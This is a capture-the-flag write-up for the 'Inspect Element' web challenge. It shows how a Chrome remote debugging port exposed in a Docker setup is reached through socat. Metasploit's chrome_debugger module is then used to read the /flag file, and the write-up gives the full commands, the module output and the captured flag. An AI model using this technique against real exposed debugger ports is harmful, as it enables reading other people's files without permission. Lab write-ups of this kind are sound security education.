# Description

Maybe using Inspect Element will help you!

Small hint: If you're struggling with reproducing it on remote, you can use socat to proxy the remote instance to 
localhost:1337 like this: `socat TCP-LISTEN:1337,fork OPENSSL:xxx--xxx-1234.ctf.kitctf.de:443`
and it should behave exactly like a locally running docker container.

# Solution

Not really sure how to start here .. since we only have access to the Dockerfile and when trying to access the webpage
we get nowhere. But since this is a Inspect Element challenge, it's probably something with debugging or developer options 
(and the flag for chrome in Dockerfile `--remote-debugging-port=13370` confirms it). Since I had no idea how to aproach
chrome developer options I tried to google it and found a metasploit exploit which can read arbitrary files using the
chrome debugger ...

First, lets start metasploit with `mfsconsole`.

After that we need to search for the module `search chrome debugger` which shows us this module:
```
   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/gather/chrome_debugger  2019-09-24       normal  No     Chrome Debugger Arbitrary File Read / Arbitrary Web Request
```
which sounds about right. Okay so lets use this module `use auxiliary/gather/chrome_debugger` and see what options we need to
provide `info 0` (or `info auxiliary/gather/chrome_debugger`):
```
Basic options:
  Name      Current Setting  Required  Description
  ----      ---------------  --------  -----------
  FILEPATH                   no        File to fetch from remote machine.
  RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT     9222             yes       The target port (TCP)
  TIMEOUT   10               yes       Time to wait for response
  URL                        no        Url to fetch from remote machine.
```

Since I've already ran the command from the description hint to proxy the remote instance to localhost, therefore the
parameters we need are:
- FILEPATH = /flag
- RHOSTS = 127.0.0.1
- RPORT = 1337

So let's set the variables and run the exploit:
```
set FILEPATH /flag
set RHOSTS 127.0.0.1
set RPORT 1337
run
```

The results:
```
[*] Running module against 127.0.0.1

[*] Attempting Connection to ws://127.0.0.1:1337/devtools/page/BF5B0F8D374DEDC80BEDA1B8BF71A3F8
[*] Opened connection
[*] Attempting to load url file:///flag
[*] Received Data
[*] Sending request for data
[*] Received Data
[+] Stored file:///flag at /home/kali/.msf4/loot/20240603171814_default_127.0.0.1_chrome.debugger._435072.txt
[*] Auxiliary module execution completed
```

And display the results:
```
cat /home/kali/.msf4/loot/20240603171814_default_127.0.0.1_chrome.debugger._435072.txt
<html>
  <head>
    <meta name="color-scheme" content="light dark">
  </head>
  <body>
    <pre style="word-wrap: break-word; white-space:pre-wrap;">
      GPNCTF{D4NG3R0U5_D3BUGG3R}
    </pre>
  </body>
</html> 
```





